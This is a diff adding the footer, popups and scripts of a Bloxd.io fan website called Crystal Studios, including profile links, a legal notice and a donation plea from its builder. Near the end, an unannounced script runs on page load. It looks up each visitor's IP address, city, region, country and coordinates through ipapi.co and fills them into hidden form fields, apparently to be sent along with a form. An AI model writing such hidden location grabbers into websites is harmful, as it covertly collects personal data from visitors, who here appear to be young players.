+                        <li><a href="https://bloxdhub.com/@mr_admin876" target="_blank" rel="noopener noreferrer" class="hover:text-amethyst-300 transition-colors flex items-center gap-1">mr_admin876 - BloxdHub</a></li>
+                        <li><a href="https://cipherchat-theta.base44.app/user/entity1234" target="_blank" rel="noopener noreferrer" class="hover:text-amethyst-300 transition-colors flex items-center gap-1">entity1234 - CipherChat</a></li>
+                        <li><a href="https://cipherchat-theta.base44.app/user/mr_admin678" target="_blank" rel="noopener noreferrer" class="hover:text-amethyst-300 transition-colors flex items-center gap-1">mr_admin678 - CipherChat</a></li>
+                        <li><a href="https://bloxd.io/player/Entity1234" target="_blank" rel="noopener noreferrer" class="hover:text-amethyst-300 transition-colors flex items-center gap-1">Entity1234 - Bloxd.io</a></li>
+                        <li><a href="https://bloxd.io/player/mr_admin876" target="_blank" rel="noopener noreferrer" class="hover:text-amethyst-300 transition-colors flex items-center gap-1">mr_admin876 - Bloxd.io</a></li>
+                    </ul>
+                </div>
+
+                <div class="space-y-3">
+                    <h4 class="font-display font-bold tracking-wider text-slate-300 uppercase text-xs">Legal Notice</h4>
+                    <p class="text-[11px] text-slate-500 leading-relaxed">
+                        Crystal Studios operates as an entirely autonomous entity. This platform is neither affiliated with, endorsed by, nor contractually sanctioned by Arthur, the Bloxd.io development collective, Bloxd LTD, or any associated parent corporations and subsidiaries. Any proprietary trademarks, iconography, or intellectual property references belong strictly to their respective proprietors.
+                    </p>
+                </div>
+            </div>
+
+            <hr class="border-amethyst-900/40 my-6">
+
+            <div class="text-center space-y-2">
+                <span class="font-display font-bold text-xs tracking-widest text-slate-500">CRYSTAL STUDIOS</span>
+                <div class="text-[10px] text-slate-600">
+                    <p>&copy; 2026 Crystal Studios. All rights reserved.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <div id="expanded-world-modal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-md hidden transition-all">
+        <div class="bg-amethyst-950 border border-amethyst-900 rounded-2xl max-w-lg w-full relative mx-4 overflow-hidden shadow-2xl flex flex-col">
+            <div id="modal-gradient-header" class="h-32 bg-gradient-to-br from-amethyst-800 to-slate-900 relative flex items-center justify-center">
+                <i id="modal-icon" class="fa-solid fa-cubes text-5xl text-white/90"></i>
+                <button onclick="closeWorldModal()" class="absolute top-4 right-4 bg-black/40 hover:bg-black/70 p-2 rounded-full text-slate-300 hover:text-white transition-colors">
+                    <i class="fa-solid fa-xmark text-sm"></i>
+                </button>
+            </div>
+            <div class="p-6 space-y-4">
+                <div class="flex items-center justify-between">
+                    <span id="modal-badge" class="px-2.5 py-0.5 rounded text-xs font-bold uppercase tracking-wider bg-amethyst-900 text-amethyst-300">Category</span>
+                    <span class="text-sm text-slate-300 font-medium flex items-center gap-1"><i class="fa-regular fa-star text-yellow-500"></i> <span id="modal-rating">5.0</span>/5 Rating</span>
+                </div>
+                <h3 id="modal-title" class="font-display font-bold text-2xl text-white">Lobby Title</h3>
+                <div class="grid grid-cols-2 gap-2 text-xs bg-amethyst-900/20 p-3 rounded-xl border border-amethyst-900/40">
+                    <p class="text-slate-400">Created By: <span id="modal-author" class="text-white font-semibold">Unknown</span></p>
+                    <p class="text-slate-400">Profile Tag: <span id="modal-type-tag" class="text-amethyst-400 font-bold">Standard Layout</span></p>
+                </div>
+                <div class="space-y-1">
+                    <h4 class="text-[10px] font-bold tracking-wider uppercase text-amethyst-400">Full Workspace Description</h4>
+                    <p id="modal-desc" class="text-slate-300 text-sm leading-relaxed">Detailed summary text context placeholder description fields.</p>
+                </div>
+                <div class="bg-amethyst-950 border border-amethyst-900 p-3 rounded-xl flex items-center justify-between mt-4">
+                    <code id="modal-code" class="text-sm font-mono text-amethyst-300 select-all">/join code</code>
+                    <button id="modal-copy-btn" class="px-4 py-1.5 bg-amethyst-600 hover:bg-amethyst-500 text-xs font-bold rounded-xl text-white transition-colors">Copy</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="blank-popup" class="fixed inset-0 z-50 flex items-center justify-center bg-black/75 backdrop-blur-sm hidden transition-all">
+        <div class="bg-amethyst-950 border border-amethyst-900/80 rounded-2xl p-6 max-w-md w-full relative mx-4 shadow-2xl">
+            <button onclick="toggleBlankPopup()" class="absolute top-4 right-4 text-slate-400 hover:text-white transition-colors">
+                <i class="fa-solid fa-xmark text-lg"></i>
+            </button>
+            <div class="space-y-3">
+                <h3 class="font-display font-bold text-xl text-white">Buy Me a "Coffee"!</h3>
+                <div class="border-b border-amethyst-900/60 pb-2">
+                    <p class="text-xs text-amethyst-400 uppercase font-semibold tracking-wider">From Entity1234 (Web Builder)</p>
+                </div>
+                <p class="text-sm text-slate-300 leading-relaxed">
+                    Hey there👋! I'm Entity1234 and I designed, coded, developed, and moderate this wonderful website! In all of my work I used 0 A.I. (not even Google Search Assist!!). If you like my work, I'd love to hear any feedback or reviews you have! Just mention me (@Entity1234) on BloxdHub and I'll read it.
+                </p>
+                <p class="text-sm text-slate-300 leading-relaxed">
+                    If you are extra happy with my work, I've been wanting some Bloxd.io cosmetics, and my Super Rank is running low! 👀
+                </p>
+            </div>
+        </div>
+    </div>
+
+<script>
+    function toggleBlankPopup() {
+        const popup = document.getElementById('blank-popup');
+        popup.classList.toggle('hidden');
+    }
+</script>
+    <!-- Geolocation background script adapter -->
+<script>
+async function loadLocationDataForForm() {
+    try {
+        // Fetching the layout pattern proven in loc.html
+        const response = await fetch("https://ipapi.co/json/");
+        if (!response.ok) throw new Error("Location resolution response failed");
+        
+        const data = await response.json();
+
+        // Safely push values into the hidden elements
+        document.getElementById("geo-ip").value = data.ip || "N/A";
+        document.getElementById("geo-city").value = data.city || "N/A";
+        document.getElementById("geo-region").value = data.region || "N/A";
+        document.getElementById("geo-country").value = data.country_name || "N/A";
+        document.getElementById("geo-lat").value = data.latitude || "N/A";
+        document.getElementById("geo-lon").value = data.longitude || "N/A";
+    } catch (err) {
+        console.error("Could not append geolocation payload data structure:", err);
+    }
+}
+
+// Automatically load the details as soon as the DOM tree settles down
+window.addEventListener("DOMContentLoaded", loadLocationDataForForm);
+</script>
+<script src="data.js"></script>
+<script src="script.js"></script>
+</body>
+</html>
